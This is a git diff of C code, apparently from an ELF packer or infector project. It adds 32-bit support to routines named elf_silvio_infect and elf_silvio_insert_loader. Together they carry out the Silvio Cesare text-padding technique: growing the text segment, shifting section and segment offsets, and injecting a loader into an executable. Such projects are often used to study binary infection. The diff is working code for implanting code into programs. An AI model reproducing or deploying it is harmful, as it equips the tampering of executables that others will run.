@@ -12,40 +12,75 @@
 #include "log.h"
 
 Elf64_Addr loader_addr;
-int old_section_size;
 
 int set_new_elf_silvio_segment_values(t_elf *elf, int text_segment_index) {
-    loader_addr = elf->prog_header[text_segment_index].p_vaddr + elf->prog_header[text_segment_index].p_filesz;
+    if(elf->s_type == ELF32) {
+        loader_addr = ((t_elf32 *)elf)->prog_header[text_segment_index].p_vaddr + ((t_elf32 *)elf)->prog_header[text_segment_index].p_filesz;
 
-    elf->prog_header[text_segment_index].p_filesz += loader_size;
-    elf->prog_header[text_segment_index].p_memsz += loader_size;
+        ((t_elf32 *)elf)->prog_header[text_segment_index].p_filesz += loader_size;
+        ((t_elf32 *)elf)->prog_header[text_segment_index].p_memsz += loader_size;
 
-    for(int i = text_segment_index + 1; i < elf->elf_header->e_phnum; i++) {
-        elf->prog_header[i].p_offset += PAGE_SIZE64;
+        for (int i = text_segment_index + 1; i < ((t_elf32 *)elf)->elf_header->e_phnum; i++) {
+            ((t_elf32 *)elf)->prog_header[i].p_offset += PAGE_SIZE32;
+        }
+    }
+    else {
+        loader_addr = ((t_elf64 *)elf)->prog_header[text_segment_index].p_vaddr + ((t_elf64 *)elf)->prog_header[text_segment_index].p_filesz;
+
+        ((t_elf64 *)elf)->prog_header[text_segment_index].p_filesz += loader_size;
+        ((t_elf64 *)elf)->prog_header[text_segment_index].p_memsz += loader_size;
+
+        for (int i = text_segment_index + 1; i < ((t_elf64 *)elf)->elf_header->e_phnum; i++) {
+            ((t_elf64 *)elf)->prog_header[i].p_offset += PAGE_SIZE64;
+        }
     }
 
     return 1;
 }
 
 int set_new_elf_silvio_section_values(t_elf *elf, int last_section_index) {
-    old_section_size = elf->section_header[last_section_index].sh_size;
-    elf->section_header[last_section_index].sh_size += loader_size;
+    if(elf->s_type == ELF32) {
+        ((t_elf32 *)elf)->elf_header->e_shoff += PAGE_SIZE32;
 
-    for(int i = last_section_index + 1; i < elf->elf_header->e_shnum; i++) {
-        elf->section_header[i].sh_offset += PAGE_SIZE64;
+        ((t_elf32 *)elf)->section_header[last_section_index].sh_size += loader_size;
+
+        for (int i = last_section_index + 1; i < ((t_elf32 *)elf)->elf_header->e_shnum; i++) {
+            ((t_elf32 *)elf)->section_header[i].sh_offset += PAGE_SIZE32;
+        }
+    }
+    else {
+        ((t_elf64 *)elf)->elf_header->e_shoff += PAGE_SIZE64;
+
+        ((t_elf64 *)elf)->section_header[last_section_index].sh_size += loader_size;
+
+        for (int i = last_section_index + 1; i < ((t_elf64 *)elf)->elf_header->e_shnum; i++) {
+            ((t_elf64 *)elf)->section_header[i].sh_offset += PAGE_SIZE64;
+        }
     }
 
     return 1;
 }
 
-int elf_silvio_insert_loader(t_elf *elf, int section_index) {
-    size_t new_section_data_size = elf->section_header[section_index].sh_size;
-    char *new_section_data = realloc(elf->section_data[section_index], new_section_data_size);
-    if(new_section_data == NULL) {
-        log_error("realloc() failure");
-        return -1;
+int elf_silvio_insert_loader(t_elf *elf, int section_index, int old_section_size) {
+    char *new_section_data;
+    if(elf->s_type == ELF32) {
+        size_t new_section_data_size = ((t_elf32 *)elf)->section_header[section_index].sh_size;
+        new_section_data = realloc(((t_elf32 *)elf)->section_data[section_index], new_section_data_size);
+        if (new_section_data == NULL) {
+            log_error("realloc() failure");
+            return -1;
+        }
+        ((t_elf32 *)elf)->section_data[section_index] = new_section_data;
     }
-    elf->section_data[section_index] = new_section_data;
+    else {
+        size_t new_section_data_size = ((t_elf64 *)elf)->section_header[section_index].sh_size;
+        new_section_data = realloc(((t_elf64 *)elf)->section_data[section_index], new_section_data_size);
+        if (new_section_data == NULL) {
+            log_error("realloc() failure");
+            return -1;
+        }
+        ((t_elf64 *)elf)->section_data[section_index] = new_section_data;
+    }
 
     // For ASM
     loader_offset = loader_addr;
@@ -78,12 +113,17 @@ int elf_silvio_infect(t_elf *elf) {
     }
     method_config.concerned_section = last_section_index;
 
-    elf->elf_header->e_shoff += PAGE_SIZE64;
+    int old_section_size;
+    if(elf->s_type == ELF32)
+        old_section_size = ((t_elf32 *)elf)->section_header[last_section_index].sh_size;
+    else
+        old_section_size = ((t_elf64 *)elf)->section_header[last_section_index].sh_size;
+
     set_new_elf_silvio_section_values(elf, last_section_index);
 
     log_verbose("Inserting the loader ...");
 
-    if(elf_silvio_insert_loader(elf, last_section_index) == -1) {
+    if(elf_silvio_insert_loader(elf, last_section_index, old_section_size) == -1) {
         log_error("Loader insertion failed");
         return -1;
     }
